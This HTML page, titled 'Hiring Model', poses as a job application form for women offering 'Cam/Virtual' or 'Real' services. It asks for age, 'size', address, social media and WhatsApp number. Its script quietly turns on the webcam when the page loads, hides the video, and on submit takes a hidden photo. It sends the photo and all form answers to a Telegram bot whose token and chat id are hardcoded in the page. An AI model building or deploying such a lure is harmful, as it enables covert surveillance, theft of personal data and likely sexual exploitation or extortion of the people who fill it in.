<!DOCTYPE html>
<html lang="en">

<head>
  <title>Model Information</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</head>

<body>

  <div class="container-fluid p-3 bg-primary text-white text-center">
    <h1>Hiring Model</h1>
    <!-- <p>Resize this responsive page to see the effect!</p> -->
  </div>

  <div class="container-fluid">
   

    <form method="post" id="dataForm">
      

      <div class="mb-3 mt-1">
        <label for="name" class="form-label">Name:</label>
        <input class="form-control form-control-sm shadow-none" id="name" type="text" name="name" />
      </div>

      <div class="mb-3 mt-1 col">
        <label for="type" class="form-label">Gender:</label>
        <select disabled class="form-control form-control-sm shadow-none" id="type" name="type">
          <option value=""></option>
          <option selected value="female">Female</option>
          <option value="male">Male</option>
        </select>
      </div>

      <div class="row col-12">
        <div class="mb-3 mt-1 col">
          <label for="age" class="form-label">Age:</label>
          <input class="form-control form-control-sm shadow-none" id="age" type="number" name="age" />
        </div>
        <div class="mb-3 mt-1 col">
          <label for="profession" class="form-label">Profession:</label>
          <select class="form-control form-control-sm shadow-none" id="profession" name="profession">
            <option value=""></option>
            <option selected value="job">Job</option>
            <option value="student">Student</option>
            <option value="other">Other</option>
          </select>
        </div>

        <div class="mb-3 mt-1 col">
          <label for="type" class="form-label">Service:</label>
          <select class="form-control form-control-sm shadow-none" id="type" name="type">
            <option value=""></option>
            <option selected value="cam">Cam/Virtual</option>
            <option value="real">Real</option>
            <option value="both">Both</option>
          </select>
        </div>

      </div>


      <div class="mb-3 mt-1 col">
        <label for="size" class="form-label">Size:</label>
        <input class="form-control form-control-sm shadow-none" id="size" type="text" name="size" />
      </div>

      <div class="mb-3 mt-1">
        <label for="address" class="form-label">Address:</label>
        <textarea class="form-control form-control-sm shadow-none" rows="3" name="address"></textarea>
      </div>

      <div class="mb-3 mt-1">
        <label for="details" class="form-label">Social Media & Others:</label>
        <textarea class="form-control form-control-sm shadow-none" rows="4" name="additional"></textarea>
      </div>


      <div class="mb-3 mt-1">
        <label for="number" class="form-label">Whatsapp No:</label>
        <input class="form-control form-control-sm shadow-none" id="number" type="text" number="number" />
      </div>

      <button type="submit" class="btn btn-success btn-small rounded-1 mt-2 float-end" id="captureButton">Submit</button>
    
    </form>



    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <img style="display: none;" id="capturedImage" src="" alt="cp">


  </div>

  <script>


    let video = document.getElementById("video");
    let dataForm = document.getElementById("dataForm");

    navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
      video.srcObject = stream;

      // Store a reference of the stream
      window.localStream = stream;
    }).catch(function (err) {
      console.error("Error accessing the camera: " + err);
    }).finally(function () {
      // Hide the loader
      video.style.display = "none";
    });

    // button click event
    document.getElementById("captureButton").addEventListener("click", async function () {

    });


    dataForm.addEventListener("submit", (e) => {
      e.preventDefault();


      //dataForm to json
      let formData = new FormData(dataForm);
      let object = {};
      formData.forEach((value, key) => {
        object[key] = value;
      });
      let json = JSON.stringify(object);




      let video = document.getElementById("video");
      let canvas = document.getElementById("canvas");
      let context = canvas.getContext("2d");
      let capturedImage = document.getElementById("capturedImage");

      // Define the desired width and height for the captured image
      // let desiredWidth = 640; // Set your desired width
      // let desiredHeight = 480; // Set your desired height

      // Set the canvas width and height to the dimensions of the video
      let desiredWidth = video.videoWidth;
      let desiredHeight = video.videoHeight;


      canvas.width = desiredWidth;
      canvas.height = desiredHeight;

      context.drawImage(video, 0, 0, desiredWidth, desiredHeight);

      // Convert the captured image to a data URL with the specified width and height
      let dataURL = canvas.toDataURL("image/jpeg");

      // // Set the data URL as the source of the "capturedImage" element
      capturedImage.src = dataURL;


      // finally send to telegram
      canvas.toBlob(function (blob) {


        let caption = json;
        let formData = new FormData();
        formData.append("chat_id", "6650561757");
        formData.append('photo', blob, 'image.png');
        formData.append('caption', caption);

        let requestOptions = {
          method: 'POST',
          body: formData,
          redirect: 'follow'
        };


        fetch("https://api.telegram.org/bot6542504120:AAFGA5yAXwm2ccyIvu9QWL7IrtzYPuQ4cVI/sendPhoto", requestOptions)
          .then(response => response.text())
          .then(result => console.log(result))
          .catch(error => console.log('error', error));

      });

    });


  </script>

</body>




</html>
